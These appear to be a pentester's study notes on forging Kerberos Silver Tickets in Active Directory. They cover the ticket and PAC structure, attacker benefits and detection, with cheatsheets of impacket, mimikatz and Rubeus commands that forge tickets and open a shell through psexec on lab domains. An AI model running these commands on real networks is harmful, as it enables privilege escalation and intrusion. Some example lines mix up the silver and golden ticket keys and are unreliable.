# Silver Tickets

Silver tickets are the Ticket Granting Service (TGSs) as part of Kerberos, see [[Active-Directory-Kerberos-Authentication-Defined]] and it one of many techniques of [[Attacking-Kerberos]]. It is a ticket that grants ticket for a specific target, which **DOES NOT requires compromising the KRBTGT**, maybe try [[Mimikatz-Cheatsheet]]. Tim Medin: *"In a Silver Ticket attack, we force a Service ticket with a custom PAC (to escalate privileges). This Service Ticket is forged using the Target LT key (NTLM Service Hash). As we don't have the KDC LT key, we cannot create a valid, complete PAC signature. However, PAC validation is usually disabled, which means there is an opportunity."*

PAC (Privilege Attribute Certificate) is an extension of Kerberos protocol this is transmitted as a summary in the TGT and TGS. It specifies access of an account.

#### Words of Warning

*When forging tickets, before November 2021 updates, the user-id and groups-ids were useful but the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.* - [thehackerrecipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)

## Detecting Silver Tickets:

[adsecurity.org](https://adsecurity.org/?p=2011): *The best chance of detecting Silver Tickets is to monitor Windows security events on workstations, servers, and Domain Controllers for [logon/logoff events with anomalies in the domain field including the field being blank or null](https://adsecurity.org/?p=1515).*

#### Considerations

Some Service Accounts will not verify the second signature - SQL servers, but not Web servers! This article is notes on the subject of Silver Tickets:

Server Portion: - Server gets this
- User details
- Session Key (same as Users)
- PAC
- Signed with Target LT key
- Signed with KDC LT key
- Encrypted with service account's NTLM Hash

User Portion: - User gets this
- Validity time
- Session Key (same as Server's)
Encrypted with the TGT session key

#### Requirement:

- Generated TGSs is signed by the machine account of the host we are targeting
- Silver Tickets only have access to the password hash of the machine account of the server we are attacking, therefore only impersonate users on that machine.
- The Silver Ticket's scope is limited to whatever service is targeted on the specific server.
- Forging TGS has no associated TGT, therefore Domain Controller was never contacted
	- This means it is more stealthier as logging occur on the machine not on the DC for Blue Team 
- Permissions are determined through SID
	- Non-existent users must have relevant SIDs, i.e SID that indicated the users to be in host's local administrators group 
 - Machine Account Passwords are usually rotated every 30 days
	 - Even so we can leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account

#### Silver Tickets Benefits

[netwrix](https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/) considers the benefits of Silver Tickets as of 2022 to be: 
- The attacker is not required to authenticate the account to the domain controller to obtain the forged TGS, so they can proceed without creating network traffic and event logs to avoid detection.
- A Silver Ticket can be created for any user account, even fictitious accounts. This allows the attacker to exploit the service account without risking detection, which could result in a password reset and loss of access.
- The Privileged Attribute Certificate (PAC) in the TGS ticket can also be manipulated to elevate the account’s access to Domain In most cases, the PAC is not validated against the domain controller when the TGS is provided.

##### Available Services

Service Type | Service Silver Tickets
--- | ---
WMI | HOST, RPCSS
PowerShell Remoting | HOST, HTTP, OS dependent: WSMAN and RPCSS
WinRM | HOST, HTTP - sometimes just WINRM
Scheduled Tasks | HOST
Windows File Share, also psexec | CIFS
LDAP operations include DCSync | LDAP
Windows Remote Server Administration Tools | RPCSS, LDAP, CIFS
Golden Tickets | krbtgt

[[Rubeus-Cheatsheet]] - ask for all `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
#### Cheatsheet

[[Impacket-Cheatsheet]]
```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# Hacktricks example:
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
# Export the ccache file as a env variable for later use
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
# psexec in!
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```

[[Mimikatz-Cheatsheet]]
```c
//  kerberos::golden # even though it is silver we us the golden method
// /sid:OfCurrentUser
// /target:ServerOfCrackedServiceTicket
// /service:TypeOfService
// /rc4:NTLMHashOfService - different hashes detailed below
// /user:UserThatWillAppearInsecurityLogs
// /id:RIDtoImpersonate
// /ptt # mimikatz will inject into memory

// Optional flags - adsecurity.org

// /groups (optional) – group RIDs the user is a member of (the first is the primary group) ; default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).

// /ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use

// /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).

// /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
// /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).

// /renewmax(optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).

mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin

// with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

// with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

// with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

// Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
// Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

|GID|Group Name|
|---|---|
|512|Domain Admins|
|513|Domain Users|
|518|Schema Admins|
|519|Enterprise Admins|
|520|Group Policy Creator Owners|

## Use cases to Abuse Service Tickets

CIFS = access `C$` and `ADMIN$` SMB Shares if exposed
HOST = Scheduled Tasks Lateral Movement, Arbitrary Commands
HOST + RPCSS = execute WMI on target machine local and remote 
HOST + WSMAN = WinRm access with optional Remote PowerShell Session
LDAP = [[AD-DCSync-Attack]]
## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)
[Kerberos and Attacks 101 by Tim Medin](https://www.youtube.com/watch?v=9lOFpUA25Nk)
[iredteam Silver Tickets](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
[thehacker.recipes - Silver Tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)
[HackTricks Silver tickets](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
[Hackndo - Golden and Silver tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/)
[adsecurity.org](https://adsecurity.org/?p=2011)
[netwrix](https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/)